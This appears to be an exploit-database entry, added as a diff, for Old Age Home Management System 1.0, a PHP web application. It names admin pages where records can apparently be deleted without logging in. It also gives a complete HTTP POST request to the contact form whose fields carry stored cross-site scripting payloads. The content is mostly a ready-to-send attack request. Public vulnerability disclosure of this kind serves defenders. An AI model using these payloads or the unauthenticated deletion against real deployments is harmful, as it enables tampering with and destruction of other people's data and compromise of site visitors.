@@ -1,0 +1,33 @@
+# Exploit Title: Old Age Home Management System 1.0 - Multi
+# Date: n/a
+# Exploit Author: OR4NG.M4N
+# Vendor Homepage: https://phpgurukul.com/old-age-home-management-system-using-php-and-mysql/
+# Software Link: https://phpgurukul.com/projects/Old-Age-Home-MS-using-PHP.zip
+# Version: v1.0
+
+you can delete any Details without login 
+
+https://localhost/oahms/admin/manage-scdetails.php
+https://localhost/oahms/admin/manage-services.php
+
+XSS Stored 
+
+POST /oahms/contact.php
+Host: localhost
+User-Agent: Safari/123
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: ar,en-US;q=0.7,en;q=0.3
+Accept-Encoding: gzip, deflate, br
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 207
+Origin: https://localhost
+Connection: keep-alive
+Referer: https://localhost/oahms/contact.php
+Cookie: PHPSESSID=fvopdb793anmi5j89o8uad8seo
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+
+fname=<script>alert(or4ng)</script>&lname=<script>alert(or4ng)</script>&phone=6776767667&email=email@email.com&message=<script>alert(or4ng)</script>&submit=Submit 
